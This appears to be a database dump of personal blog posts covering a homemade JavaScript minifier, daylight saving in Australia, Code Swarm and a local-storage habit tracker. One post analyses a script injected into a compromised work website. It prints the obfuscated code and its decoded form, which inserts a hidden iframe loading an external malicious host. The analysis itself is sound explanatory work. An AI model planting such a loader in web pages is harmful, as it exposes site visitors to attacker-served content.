        $.get("https://assets.themetacity.com/video/" + startPoster + ".startposter.svg", function (zy) {
            $startPoster = zr.importNode(zy.documentElement, true);
            $startPoster = $($startPoster);

            $startPoster.attr("class", "poster");
            $startPoster.attr("height", $(t).height());
            $startPoster.attr("width", $(t).width());

            $("#playButton", $startPoster).on("click", function () {
                t.load();   // Initial data and metadata load events may have fired before they can be captured so manually fire them
                s(t);
                $startPoster.remove(); // done with poster forever
            });
            j.append($startPoster);
            $(j).trigger("reposition");
        });

        // Add whe whole lot onto the page
        j.append(i);

        $(j).trigger("reposition"); //Get its position right.
    });

    // Handle coming out of fullscreen
    $(zr).on("webkitfullscreenchange mozfullscreenchange fullscreenchange", function () {
        var zp = zr.fullScreen || zr.mozFullScreen || zr.webkitIsFullScreen;

        $(zq).each(function () {  // set to script scope as fullScreenElement appears to not work (yet?)
            var t = this, videoTime = t.currentTime;
            if (zp) {
                $("source", t).each(function () {
                    // .dataset.fullscreen is is treated a boolean, but it is just truthy string
                    // This function uses a standard format of names of full screen appropriate vids as shown below:
                    // original: originalvid.xyz            full screen: originalvid.fullscreen.xyz
                    // N.B. Can not have period (".") in original file same except for filetype
                    if (this.dataset.fullscreen) {
                        var zo = this.src.split(".");
                        this.src = zo[0] + "." + zo[1] + "." + zo[2] + ".fullscreen." + zo[3];
                    }
                    t.load();
                });
            } else {  // Have left fullscreen and need to return to lower res video
                $("source", t).each(function () {
                    // Remove the full screen and go back to the original file
                    if (this.dataset.fullscreen) {
                        var zo = this.src.split(".");
                        this.src = zo[0] + "." + zo[1] + "." + zo[2] + "." + zo[4];
                    } // Nothing was changed if data-fullscreen is false so no need to do anything

                    $(this).parent().load();  // The video
                    $(this).parent().trigger("reposition");  // The video container box
                });
            }
            $(t).on("loadedmetadata", function () {
                this.currentTime = videoTime;  // Skip to the time before we went full screen
                s(t);
            });
        });
    });
    $(window).on("resize", function () {
        $(z).each(function () {
            $(this).parent().trigger("reposition");
        });
    });
});
```

Much better.
[Next time I will go through][pt2link] the next steps in minification and compare end results.

[ghTMC] https://github.com/dougmiller/theMetaCity/tree/master/media/js "See ''theMetaCity'' on GitHub."
[ghSearcher.js] https://github.com/dougmiller/theMetaCity/blob/master/media/js/searcher.js "See the file ''searcher.js'' on GitHub."
[grasp] http://www.graspjs.com "Grasp homepage"
[pt2link]: /blog/lets-make-a-terrible-JS-minifier-pt2 "Lets make a terrible JS minier: Part 2"','014373fd-3290-7bf9-8b05-6dbceb5c510f'::uuid),
	('014378f5-c000-7d2e-9776-dcd7eaa68457'::uuid,'Lets make a terrible JS minifier: Part 2','lets-make-a-terrible-js-minifier-part-2','Part two of a fun little series on minifying some JavaScript','blog'::com.variant,'[Following on from part 1][pt1link], I am now going to show the next step in minification and then compare results from minified and non minified files.

Now that we have minified variable names, lets look at removing some more of the extranious syntax we need to use as developers to help understand the program but isn''t actually necessary to make things work.

Let''s go back to searcher and strip things out.

```
:::javascript
$(document).ready(function () {
    "use strict";
    var $noResults, $searchBox, $entries, searchTimeout, firstRun, loc, hist, win;
    $noResults = $(''#noresults'');
    $searchBox = $(''#searchinput'');
    $entries = $(''#workshopBlurbEntries'');
    searchTimeout = null;
    firstRun = true;
    loc = location;
    hist = history;
    win = window;

    function reset() {
        if (hist.state !== undefined) {  // Avoid infinite loops
            hist.pushState({"tag": undefined}, "theMetaCity - Workshop", "/workshop/");
        }
        $noResults.hide();
        $entries.fadeOut(150, function () {
            $(''header ul li'', this).removeClass(''searchMatchTag'');
            $(''header h1 a span'', this).removeClass(''searchMatchTitle'');  // The span remains but it is destroyed when filtering using the text() function
            $(".workshopentry", this).show();
        });
        $entries.fadeIn(150);
    }

    function filter(searchTerm) {
        if (searchTerm === undefined) {  // Only history api should push undefined to this, explicitly taken care of otherwise
            reset();
        } else {
            var rePattern = searchTerm.replace(/[.?*+^$\[\]\\(){}|]/g, "\\$&"), searchPattern = new RegExp(''('' + rePattern + '')'', ''ig'');  // The brackets add a capture group

            $entries.fadeOut(150, function () {
                $noResults.hide();

                $(''header'', this).each(function () {
                    $(this).parent().hide();

                    // Clear results of previous search
                    $(''li'', this).removeClass(''searchMatchTag'');

                    // Check the title
                    $(''h1'', this).each(function () {
                        var textToCheck = $(''a'', this).text();
                        if (textToCheck.match(searchPattern)) {
                            textToCheck = textToCheck.replace(searchPattern, ''<span class="searchMatchTitle">$1</span>'');  //capture group ($1) used so that the replacement matches the case and you don''t get weird capitolisations
                            $(''a'', this).html(textToCheck);
                            $(this).closest(''.workshopentry'').show();
                        } else {
                            $(''a'', this).html(textToCheck);
                        }
                    });

                    // Check the tags
                    $(''li'', this).each(function () {
                        if ($(this).text().match(searchPattern)) {
                            $(this).addClass(''searchMatchTag'');
                            $(this).closest(''.workshopentry'').show();
                        }
                    });
                });

                if ($(''.workshopentry[style*="block"]'').length === 0) {
                    $noResults.show();
                }

                $entries.fadeIn(150);
            });
        }
    }

    $(''header ul li a'', $entries).on(''click'', function () {
        hist.pushState({"tag": $(this).text()}, "theMetaCity - Workshop - " + $(this).text(), "/workshop/tag/" + $(this).text());
        $searchBox.val('''');
        filter($(this).text());
        return false;  // Using the history API so no page reloads/changes
    });

    $searchBox.on(''keyup'', function () {
        clearTimeout(searchTimeout);
        if ($(this).val().length) {
            searchTimeout = setTimeout(function () {
                var searchVal = $searchBox.val();
                hist.pushState({"tag": searchVal}, "theMetaCity - Workshop - " + searchVal, "/workshop/tag/" + searchVal);
                filter(searchVal);
            }, 500);
        }

        if ($(this).val().length === 0) {
            searchTimeout = setTimeout(function () {
                reset();
            }, 500);
        }
    });

    $(''#reset'').on(''click'', function () {
        $searchBox.val('''');
        reset();
    });

    win.addEventListener("popstate", function (event) {
        console.info(hist.state);
        if (event.state === null) { // Start of history chain on this page, direct entry to page handled by firstRun)
            reset();
        } else {
            if (event.state.tag !== undefined) {
                $searchBox.val(event.state.tag);
                filter(event.state.tag);
            }
        }
    });

    $noResults.hide();

    if (firstRun) {                               // 0     1     2        3      4 (if / present)
        var locArray = loc.pathname.split(''/'');   // ''/workshop/tag/searchString/
        if (locArray[2] === ''tag'' && locArray[3] !== undefined) {    // Check for direct link to tag (i.e. if something in [3] search for it)
            hist.pushState({"tag": locArray[3]}, "theMetaCity - Workshop - " + locArray[3], "/workshop/tag/" + locArray[3]);
            filter(locArray[3]);
        } else if (locArray[2] === '''') {   // Root page and really shouldn''t do anything
            //hist.pushState({"tag": undefined}, "theMetaCity - Workshop", "/workshop/");
        }   // locArray[2] === somepagenum is an actual page and what should be allowed to happen by itself

        firstRun = false;
        // Save state on first page load
    }
});
```

Lots of what you see here is unnecessary for the program to execute correctly: comments, white space, new lines etc. Let''s strip them out and see what we get. sed is our friend here again.

```
:::bash
sed -i ''s/[^:]\/\/.*//g'' tmcscripts.js                          # Dont need comments (and they become greedy when everything is on a single line). [:] is for urls (which have //)
sed -i ''s/ #\*.*$//''g tmcscripts.js                             # Dont need comments (and they become greedy when everything is on a single line)
sed -i ''/console.*/''d tmcscripts.js                             # Debug statements
sed -i ''s/^[ \t]*//'' tmcscripts.js                              # Leading whitespace and tabs N.B in theory there shouldnt need to be tabs anywhere but I am sure there will be
sed -i ''s/[ \t]*$//'' tmcscripts.js                              # Trailing whitespace and tabs
sed -i ''s/ () /()/g'' tmcscripts.js                              # Spaces in ''function () {''
sed -i ''s/ + /+/g'' tmcscripts.js                                # Spaces in ''x + y''
sed -i ''s/ || /||/g'' tmcscripts.js                              # Spaces in ''x || y''
sed -i ''s/for (/for(/g'' tmcscripts.js                           # Spaces in ''for ('' Usually in a for loop
sed -i ''s/; /;/g'' tmcscripts.js                                 # Spaces in ''; '' Usually in a for loop
sed -i ''s/ \(&lt;\|&lt;=\|&gt;\|&gt;=\) /\1/g'' tmcscripts.js    # Spaces in ''x &lt; y|x &gt; y|x &lt;= y|x &gt;= y'' Usually in a for loop
sed -i ''s/ \(+=\|-=\) /\1/g'' tmcscripts.js                      # Spaces in ''x += y|x -= y''
sed -i ''s/ \(=\+\) /\1/g'' tmcscripts.js                         # Spaces in ''x = y'', ''x == y'', ''x === y''
sed -i ''s/) {/){/g'' tmcscripts.js                               # End of parameter list and opening curly brace
sed -i ''s/if (/if(/g'' tmcscripts.js                             # End of if and opening round bracket
sed -i ''s/, \(.\)/,\1/g'' tmcscripts.js                          # Comma space anything
sed -i '':a;N;$!ba;s/\n//g'' tmcscripts.js                        # New lines N.B. Put this at the end otherwise other operation (like get rid of leading white space) get confused
```

Which results in this nice guy here:

```
:::javascript
$(document).ready(function(){"use strict";var z,y,x,w,v,u,t,s;z=$(''#noresults'');y=$(''#searchinput'');x=$(''#workshopBlurbEntries'');w=null;v=true;u=location;t=history;s=window;function k(){if(t.state !== undefined){t.pushState({"tag": undefined},"theMetaCity - Workshop","/workshop/");}z.hide();x.fadeOut(150,function(){$(''header ul li'',this).removeClass(''searchMatchTag'');$(''header h1 a span'',this).removeClass(''searchMatchTitle'');$(".workshopentry",this).show();});x.fadeIn(150);}function l(r){if(r===undefined){k();} else {var q=r.replace(/[.?*+^$\[\]\\(){}|]/g,"\\$&"),p=new RegExp(''(''+q+'')'',''ig'');x.fadeOut(150,function(){z.hide();$(''header'',this).each(function(){$(this).parent().hide();$(''li'',this).removeClass(''searchMatchTag'');$(''h1'',this).each(function(){var o=$(''a'',this).text();if(o.match(p)){o=o.replace(p,''<span class="searchMatchTitle">$1</span>'');$(''a'',this).html(o);$(this).closest(''.workshopentry'').show();} else {$(''a'',this).html(o);}});$(''li'',this).each(function(){if($(this).text().match(p)){$(this).addClass(''searchMatchTag'');$(this).closest(''.workshopentry'').show();}});});if($(''.workshopentry[style*="block"]'').length===0){z.show();}x.fadeIn(150);});}}$(''header ul li a'',x).on(''click'',function(){t.pushState({"tag": $(this).text()},"theMetaCity - Workshop - "+$(this).text(),"/workshop/tag/"+$(this).text());y.val('''');l($(this).text());return false;});y.on(''keyup'',function(){clearTimeout(w);if($(this).val().length){w=setTimeout(function(){var n=y.val();t.pushState({"tag": n},"theMetaCity - Workshop - "+n,"/workshop/tag/"+n);l(n);},500);}if($(this).val().length===0){w=setTimeout(function(){k();},500);}});$(''#reset'').on(''click'',function(){y.val('''');k();});s.addEventListener("popstate",function (event){if(event.state===null){k();} else {if(event.state.tag !== undefined){y.val(event.state.tag);l(event.state.tag);}}});z.hide();if(v){var locArray=u.pathname.split(''/'');if(locArray[2]===''tag'' && locArray[3] !== undefined){t.pushState({"tag": locArray[3]},"theMetaCity - Workshop - "+locArray[3],"/workshop/tag/"+locArray[3]);l(locArray[3]);} else if(locArray[2]===''''){}v=false;}});`
```

One caveat here is that this is not a general purpose minifier. The files it processes need to conform to certain standard formatting: no multi-line comments (using /\* \*/) and code deliberately designed to confuse these obviously (E.G. `ar foo,       bar`). This is made all the easier for having a single developer on this. hopefully the comments for each line help make sense as to what is going on. The general format is: `sed -i` to apply sed to a file in place (edit the file and don''t pipe to output), `s/foo/bar/`, `s` for substitute (foo with bar) to replace and `g` to do this to the whole file (globally) and not just once. `g` can be replaced with a number (n), so the operation is applied n times. The default when omitting g or n is once.

So where does this get us?

| File | presize (b) | postsize (b) |
| :--: | :---------: | :----------: |
| searcher.js | 4701 | 1940 |
| video.js| 12575 | 5069 |
| ga.js | 391 | 391 |
| combined| 17667 | 7400 |

<table>
    <thead>
        <th>file</th>
        <th>presize (b)</th>
        <th>postsize (b)</th>
    </thead>
    <tr>
        <td>searcher.js</td>
        <td>4701</td>
        <td>1940</td>
    </tr>
    <tr>
        <td>video.js</td>
        <td>12575</td>
        <td>5069</td>
    </tr>
    <tr>
        <td>ga.js</td>
        <td>391</td>
        <td>391</td>
    </tr>
    <tr>
        <td>combined</td>
        <td>17667</td>
        <td>7400</td>
    </tr>
</table>

Note the ga.js is Google Analytics, which is already minified and so all we need to do is add it to our tmcscripts.js file, and we are good to go. So what we get here is a file reduced to 41% of its original size and two fewer http requests. Not too bad.

In the next part I will go through automating this as part of the build and deployment.

[pt1link]: /blog/lets-make-a-terrible-JS-minifier "Lets make a terrible JS minifier: Part 1"','014373fd-3290-7bf9-8b05-6dbceb5c510f'::uuid),
	('01438870-9460-79fd-9ee1-e01148670ee9'::uuid,'Lets make a terrible JS minifier: Part 3','lets-make-a-terrible-js-minifier-part-3','Part three and penultimate post of a fun little series on minifying some JavaScript','blog'::com.variant,'[Following on from part 2][pt2link], I''ll show you how I integrate this in to development and deployment workflow for great good!

Throughout the previous examples you would have seen lines like `cat temp.js >> tmcscripts.js` and `rm temp.js`. These actions pretty much sum up how this all works:

1. Copy the first file (searcher.js) to a temp file: `cat searcher.js > temp.js`
2. Run the viable minification on it (part 1)
3. Append (and create since first file) to tmcscripts.js `cat temp > tmcscripts.js`
4. Remove temp file
5. Copy the second file (video.js) to a temp file: `cat video.js > temp.js`
6. Run the viable minification on it (part 1)
7. Append to tmcscripts.js `cat temp >> tmcscripts.js`
8. Remove temp file
9. Repeat for any more scripts to be minified (none ATM)
10. Perform general minification on tmcscripts.js
11. Append any files that need to be there but not (or are already) minified

You will end up with this:

    #!/bin/bash

    # Combine and minify all the js files into one file to save on requests and bytes

    cd media/js # Move to directory with scripts from base directory

    echo ''Begin smooshing searcher.js''

    #  Minify the variable names.
    #  Each script is put in its own function scope so other scripts should (in theory) have no problems with this
    cat searcher.js > temp.js
    grasp -i ''#$noResults'' -R z temp.js
    ...
    sed -i ''s/searchVal\b/n/g'' temp.js  # current bug with grasp where it cant parse 3 or more variables on the same line

    # Function names
    grasp -i ''#filter'' -R m temp.js
    ...

    cat temp.js > myscript.js
    rm temp.js

    echo ''Begin smooshing video.js''

    # Begin the smooshing of video.js
    cat video.js > temp.js

    grasp -i ''#videos'' -R z temp.js
    ...
    grasp -i ''#doc'' -R zr temp.js

    cat temp.js >> tmcscripts.js
    rm temp.js

    # Finished with video.js

    echo ''Finished with home brew scripts''
    echo ''Begin general minification''

    sed -i ''s/[^:]\/\/.*//g'' tmcscripts.js            # Dont need comments (and they become greedy when everything is on a single line). [:] is for urls (which have //)
    ...
    sed -i '':a;N;$!ba;s/\n//g'' tmcscripts.js          # New lines N.B. Put this at the end otherwise other operation (like get rid of leading white space) get confused

    echo ''Finished  general minification''

    echo ''Adding in GA (unmolested)''
    # GS is already optimised and mucking with it further seems to break things so just append it at the end
    cat ga.js >> tmcscripts.js

    echo ''Finished with GA''
    echo ''Finished combining all JavaScript files''


Now we have a minified file ready to be deployed and dealt with (which is another post).


[pt2link]: /blog/lets-make-a-terrible-JS-minifier-pt2 "Lets make a terrible JS minifier: Part 2"','014373fd-3290-7bf9-8b05-6dbceb5c510f'::uuid),
	('0143a759-5c40-73e0-b91f-a1616152d15f'::uuid,'Lets make a terrible JS minifier: Part 4','lets-make-a-terrible-js-minifier-part-4','This is the fourth and final part of the minifier write up of a fun little series on minifying some JavaScript','blog'::com.variant,'This is the fourth and final part of the minifier write up.

It is important to look and the goal of a minifier and how it is produced as it highlights a lot of the processes that goes into software development. The main lesson to take away from this is that any project, process or program is subject to constraints and goals outside of the program itself and you need to be aware of and reflect upon them.

For example: the minifier''s goal is to reduce the bandwidth and requests needed to download the JavaScript files and to this end it does a pretty good job. But it could be better. Looking over the resulting code there are a number of subtle ways to make it better: we could optimise for variable replacement symbol size, i.e replacing a 5 byte word with a one byte word is better than replaceing a three byte word with a two byte word). One way to make this more efficient would be to count the lengh of each word and multiply it by the number of times each appears and then replace them in a decending maner which would make sure that the most used words have the shrortest replacements.

There are more ways too: selectors that reference CSS classes are not replaced and some of them are quite wordy which could be a few more bytes saved. What about redundant lines? An entire line of code gone is a potentially much better reduction than a word or two. It is a very deep rabbit hole.

Which brings me back to my point. Any decision about how this works or goal you have for it is subject to trade offs in lots of different areas. By working out length by times used, you need a way to be abole to do that: parse it of some kind of hacked up counting scheme, all of which need to be written and maintained and understood by everyone inviolved in the project. All for a few bytes? It might be worth it but you certainly dont get it for free. Same problem with the CSS selectors too: by minifiying them you reduce readability in both languages so now everything is harder to  understand, maintain and extend. Why not automate that? Sure but that is another dependancy or system to maintain and support. If you remove that one line of code, does it make it harder for your you and others to understand what was is intended and what is happening? What about when you need to make changes? Can you find where the bug is with less code?

The point here is there is no one right answer to this. There is however a finite number of hours in the day, wasted time on mis or unclear communication and potentailly lower hanging fruit to grasp for. Make sure you understand the bigger picture of how your project/system/whatever fits in and where your time is best spent.

This concludes the write-up on the minifier. You can see the [whole lot on the archive][tmcarchive] or using the links at the start of the post.

[tmcarchive]: /blog/archive "theMetaCity archive"','014373fd-3290-7bf9-8b05-6dbceb5c510f'::uuid),
	('0143e005-4f68-7683-b7e8-2361cb343d41'::uuid,'Daylight savings time visualised','daylight-savings-revisited','What is Daylight Saving actually doing in Australia?','blog'::com.variant,'Every year on the first Sunday of October, the lower East and Southern states and territories of Australia observe Daylight Savings Time (DST). Every year the there is some debate about Queensland adopting the practice. Every year the same arguments get bandied out. Let''s look at what DST actually looks like.

This is the sunrise and sunset times plotted over about two years to a reasonable accuracy for my hometown of Brisbane. Blue area is time with the sun has technical set but twilight may remain; orange is time at work (assuming one hour lunch so start at 8:30am). Interestingly the Summer (and Winter) Solstice does not fall on the day with the earliest and latest sunrise (and latest and earliest rise/set for Winter). You can see this in the image below as the rise and set patterns are not symmetrical. This is due to the elliptical orbit combined with the tilt of the planet, which is a bit off-topic.

![The Brisbane sun time map.][imgsunrisebrisbane]

As you can see, there is a seasonal variation in total daylight time of about two hours. More importantly for daylight savings, the time after work is about two hours (assuming finishing work at 5pm, which I do for the rest of the article).

This is Melbourne:

![The Melbourne sun time map.][imgsunrisemelbourne]

Unsurprisingly, due to being much further South, this city has a much bigger range of daylight times. In Summer there is nearly four hours of sunlight after work, while in Winter there is almost no sun (comparable to Brisbane). Interestingly there is nearly three hours of sunlight in the morning.

This time in the morning is where the impetus for DST comes in: that this time before work is better utalised after work.

![The Melbourne DST sun time map.][imgsunrisemelbournedst]

Perfect: we now have a reasonable mount of daylight before work and nearly five hours of daylight in which to enjoy time not working. Obviously there is no point to doing DST in Winter as there is no ''wasted'' daylight to absorb and getting up in the dark is horrible.

Not everything is perfect though. What happens where DST and non-DST areas need to interact: Southern Queensland and Northern NSW, Western SA and Eastern WA. What about [three times zones at one place?][poeppelscorner] (yes, no business would take place there).

This highlights the point of DST though: it is a helpful system for workers in an <mark>industrial</mark> economy. It makes no sense for agrarian businesses since cows do not care what time your clock says to get up, you get up with the sun. Farmers need to interact with the outside world however, so they run into industrial and transport workers at some point and so problems arise there.

Indeed, here in Queensland the main resistance is farmers and country workers, saying no while the metropolitan area saying yes. Make sense since those in the west already are an hour (the sun rises an hour later for the same time) behind the east coast and further changes just make things harder. In the last 5 years or so there has been a small lobbying group established (who have also run as a single issue party in the[2009 election and 2012 south Brisbane by-election][dstparty]). The split time-zone idea makes sense, and I would be up for a trial which would look like this:

![The Brisbane DST sun time map.][imgsunrisebrisbanedst]


[imgsunrisebrisbane]: https://assets.themetacity.com/image/blog/timezonesbrisbane.svg "The Brisbane sun time map."

[imgsunrisemelbourne]: https://assets.themetacity.com/image/blog/timezonesmelbourne.svg "The Melbourne sun time map."

[imgsunrisemelbournedst]: https://assets.themetacity.com/image/blog/timezonesmelbournedtsinc.svg "The Melbourne sun time map."

[imgsunrisebrisbanedst]: https://assets.themetacity.com/image/blog/timezonesbrisbanedstinc.svg "The Brisbane DST sun time map."

[poeppelscorner]: http://en.wikipedia.org/wiki/Poeppel_Corner "Poeppels corner where Quensland, the NT and SA all meet. With three differeent time zones."

[dstparty]: https://en.wikipedia.org/wiki/Daylight_Saving_for_South_East_Queensland "Single issue parties have traditionally not fared very well."',NULL),
    ('0143f9c9-7898-70fe-ae1e-831e79557bd3'::uuid,'Code Swarm of the MetaCity 2006 - 2014','code-swarm-of-the-metacity-2006-2014','Ten years of vis on theMetaCity git repository','blog'::com.variant,'I started the MetaCity website as part of a University project nearly 10 years ago. It has come a long way in that time, and I have learnt a lot along with it. This is the Code Swarm of the git history (migrated from SVN ~3 years ago). Thankfully I have the day dot as part of that history.

<video width="800" height="600" controls data-poster="https://assets.themetacity.com/video/codeswarm200114poster.svg">
    <source src="https://assets.themetacity.com/video/code_swarm200114.avi" type=''video/avi;codec="FMP4"''>
    <source src="https://assets.themetacity.com/video/code_swarm200114.webm" type=''video/webm;codecs="vp8, vorbis"''>
</video>

The repo for this can be found on [my github page][github]. Feel free to do whatever you like with it.

[Code Swarm itself has been around][codeswarm] for a while now too. The main repo is starting to show its age with compatability issues cropping up. I would reccomend [looking at Peter Burn''s fork][ricticswarm] as he has refined a lot of the tools used and brought up minimum versions to something approaching what is availible today. Still on Python 2 but it runs without hassle.


[github]: /github "My GitHub page"
[codeswarm]: http://code.google.com/p/codeswarm/ "Original Code Swarm on Google Code"
[ricticswarm]: https://github.com/rictic/code_swarm "Rictic''s fork of Code Swarm on GitHub"',NULL),
	('014418b2-b1c0-76d1-85c4-ae50758b7ec4'::uuid,'Decoding found malware','decoding-found-malware','Video test of screen recording while de-obfuscating some malware found at work','blog'::com.variant,'Early last year (2013), the main website at work had been compromised and (amongst other things) a malicious script had been inserted. I was able to grab a copy of the scipt, albeit second hand and will go through how it works.

This is how I received the code (or I initially mucked around with it and left it like this, I can not remember).

```
:::javascript
zz=''val'';
e=this[fromCharCode["substr"](11)+zz];




zz=''val'';
ss=[];

e=this.fromCharCode(substr(11)+''val'');

n=&quot;3.5$3.5$51.5$50$15$19$49$54.5$48.5$57.5$53.5$49.5$54$57$22$50.5$49.5$57$33.5$53$49.5$53.5$49.5$54$57$56.5$32$59.5$41$47.5$50.5$38$47.5$53.5$49.5$19$18.5$48$54.5$49$59.5$18.5$19.5$44.5$23$45.5$19.5$60.5$5.5$3.5$3.5$3.5$51.5$50$56$47.5$53.5$49.5$56$19$19.5$28.5$5.5$3.5$3.5$61.5$15$49.5$53$56.5$49.5$15$60.5$5.5$3.5$3.5$3.5$49$54.5$48.5$57.5$53.5$49.5$54$57$22$58.5$56$51.5$57$49.5$19$16$29$51.5$50$56$47.5$53.5$49.5$15$56.5$56$48.5$29.5$18.5$51$57$57$55$28$22.5$22.5$53.5$55.5$59.5$49.5$54$57.5$22$49$54$56.5$23$25.5$22$48.5$54.5$53.5$22.5$49$22.5$25$23$25$22$55$51$55$30.5$50.5$54.5$29.5$23.5$18.5$15$58.5$51.5$49$57$51$29.5$18.5$23.5$23$18.5$15$51$49.5$51.5$50.5$51$57$29.5$18.5$23.5$23$18.5$15$56.5$57$59.5$53$49.5$29.5$18.5$58$51.5$56.5$51.5$48$51.5$53$51.5$57$59.5$28$51$51.5$49$49$49.5$54$28.5$55$54.5$56.5$51.5$57$51.5$54.5$54$28$47.5$48$56.5$54.5$53$57.5$57$49.5$28.5$53$49.5$50$57$28$23$28.5$57$54.5$55$28$23$28.5$18.5$30$29$22.5$51.5$50$56$47.5$53.5$49.5$30$16$19.5$28.5$5.5$3.5$3.5$61.5$5.5$3.5$3.5$50$57.5$54$48.5$57$51.5$54.5$54$15$51.5$50$56$47.5$53.5$49.5$56$19$19.5$60.5$5.5$3.5$3.5$3.5$58$47.5$56$15$50$15$29.5$15$49$54.5$48.5$57.5$53.5$49.5$54$57$22$48.5$56$49.5$47.5$57$49.5$33.5$53$49.5$53.5$49.5$54$57$19$18.5$51.5$50$56$47.5$53.5$49.5$18.5$19.5$28.5$50$22$56.5$49.5$57$31.5$57$57$56$51.5$48$57.5$57$49.5$19$18.5$56.5$56$48.5$18.5$21$18.5$51$57$57$55$28$22.5$22.5$53.5$55.5$59.5$49.5$54$57.5$22$49$54$56.5$23$25.5$22$48.5$54.5$53.5$22.5$49$22.5$25$23$25$22$55$51$55$30.5$50.5$54.5$29.5$23.5$18.5$19.5$28.5$50$22$56.5$57$59.5$53$49.5$22$58$51.5$56.5$51.5$48$51.5$53$51.5$57$59.5$29.5$18.5$51$51.5$49$49$49.5$54$18.5$28.5$50$22$56.5$57$59.5$53$49.5$22$55$54.5$56.5$51.5$57$51.5$54.5$54$29.5$18.5$47.5$48$56.5$54.5$53$57.5$57$49.5$18.5$28.5$50$22$56.5$57$59.5$53$49.5$22$53$49.5$50$57$29.5$18.5$23$18.5$28.5$50$22$56.5$57$59.5$53$49.5$22$57$54.5$55$29.5$18.5$23$18.5$28.5$50$22$56.5$49.5$57$31.5$57$57$56$51.5$48$57.5$57$49.5$19$18.5$58.5$51.5$49$57$51$18.5$21$18.5$23.5$23$18.5$19.5$28.5$50$22$56.5$49.5$57$31.5$57$57$56$51.5$48$57.5$57$49.5$19$18.5$51$49.5$51.5$50.5$51$57$18.5$21$18.5$23.5$23$18.5$19.5$28.5$5.5$3.5$3.5$3.5$49$54.5$48.5$57.5$53.5$49.5$54$57$22$50.5$49.5$57$33.5$53$49.5$53.5$49.5$54$57$56.5$32$59.5$41$47.5$50.5$38$47.5$53.5$49.5$19$18.5$48$54.5$49$59.5$18.5$19.5$44.5$23$45.5$22$47.5$55$55$49.5$54$49$32.5$51$51.5$53$49$19$50$19.5$28.5$5.5$3.5$3.5$61.5&quot;.split(&quot;$&quot;);

for(i=0; i &lt; 585; i++){
    ss=ss+String.fromCharCode(2*(1+1*n[i]));
}

e(ss);
```

The code itself is quite straightforward and relies on some fun obfuscation to (presumably) get around detection.

`51.5$53$49$19$50$19.5$28.5$5.5$3.5$3.5$61.5&quot;.split("$");`


Is simply a "$" delimited list which contains a bunch of numbers of which about half end in .5.

```
:::javascript
for(i=0; i &lt; 585; i++){
    ss=ss+String.fromCharCode(2*(1+1*n[i]));
}
```

This is the fun bit: for each number in the list, (starting from the inside out) multiply by one (`1*n[i]`) doing nothing and then add 1 (5.5 becomes 6.5) and then multiply that by 2. Multiplying by two removes the .5, and so we are guarenteed to integers which is useful as we then run these through the function fromCharCode (this is a messed up part, I think b/c I mucked it up when it was discovered) which converts said integers into their unicode representations. For Unicode representations that look (in this case) like code. Code which can be eval()''d (made from the first couple lines via simple concatenation and also mucked up by me). We end up with:

```
:::javascript

if (document.getElementsByTagName(''body'')[0]){
    iframer();
} else {
    document.write("&lt;iframe src=''http://mqyenu.dns05.com/d/404.php?go=1'' width=''10'' height=''10'' style=''visibility:hidden;position:absolute;left:0;top:0;''&gt;&lt;/iframe&gt;");
}
function iframer(){
    var f = document.createElement(''iframe'');f.setAttribute(''src'',''http://mqyenu.dns05.com/d/404.php?go=1'');f.style.visibility=''hidden'';f.style.position=''absolute'';f.style.left=''0'';f.style.top=''0'';f.setAttribute(''width'',''10'');f.setAttribute(''height'',''10'');
    document.getElementsByTagName(''body'')[0].appendChild(f);
}
```

Which inserts an invisible IFrame and runs whatever was returned by the (now defunct) page.

I did this because I wanted to test the screen recording software that comes with Cinnamon I recorded playing around with this. Enjoy.

<video width="640" height="360" controls data-poster="https://assets.themetacity.com/video/foundmalwaredecodeposter.svg">
    <source src="https://assets.themetacity.com/video/foundmalwaredecode.webm" type=''video/webm;codecs="vp8, vorbis"'' data-fullscreen="true">
    <source src="https://assets.themetacity.com/video/foundmalwaredecode.mp4" type=''video/mp4;codec="avc1"'' data-fullscreen="true">
</video>',NULL),
	('01443274-1fb8-7a54-84f3-8647a802b954'::uuid,'15 minute chains and local storage','15-minute-chains-and-local-storage','Test of the local storage API in modern browsers with habit building to boot','blog'::com.variant,'As an exercise in learning some more JavaScript, I decided to write a little goal progress monitor/tracker.

The initial idea is pretty straight forward: a checkbox that shows you if you have checked off the task for today and also shows the past week (or whatever) below it, forming a continuous chain. The idea is to not break the chain (of days completed).

![Initial paper drawing of mockup of design. It shows a check-list of ideas and technologies to used.][initialdesign]

The initial HTML is pretty straightforward with some divs representing each goal/activity to track, and some child divs representing how long you want to track. The H1 is both the name of the activity, and the key used to track it. We will see more on that below.

```
:::html
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>15 Minutes Chain</title>
        <meta charset="utf-8">
        <link href="style.css" rel="stylesheet" type="text/css" media="screen"/>
    </head>
    <body>
        <div id="maincontainer">
            <div class="chainContainer">
                <h1>Stretching</h1>
                <div class="today"></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
            <div class="chainContainer">
                <h1>Piano</h1>
                <div class="today"></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
            <div class="chainContainer">
                <h1>Guitar</h1>
                <div class="today"></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
            <div class="chainContainer">
                <h1>Deutsch</h1>
                <div class="today"></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
        </div>
        <h5 id="reset">Reset</h5>
        <script src="script.js" type="application/javascript;version=1.7"></script>
    </body>
</html>
```

The CSS is pretty straightforward too:

```
:::css
@charset "utf-8";

html {
    color: #BCBCBC;
}

body {
    margin: 100px auto auto;
    width: 800px;
}

.chainContainer {
    width: 25%;
    float: left;
    text-align: center;
}

.chainLink {
    height: 50px;
    width: 50px;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
}

.today {
    border: solid gray;
    -moz-box-sizing: border-box;
}

.done {
    background-color: green;
}

.notdone {
    background-color: red;
}
```

You will notice that there are a few Firefox specific things going on. My primary browser is Firefox, so I made this for that. The <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/box-sizing">first is the -moz-box-sizing</a> in the CSS mostly to make all the boxes appear the same when there is a border and when there is not without messing with border and widths.

The second is the use of `<let>`. This is a JavaScript 1.7 change that I used because I wanted to see how it would affect things. To make it work (at the time of writing) you need to have the <code>type="application/javascript;version=1.7"</code> in your script tag.

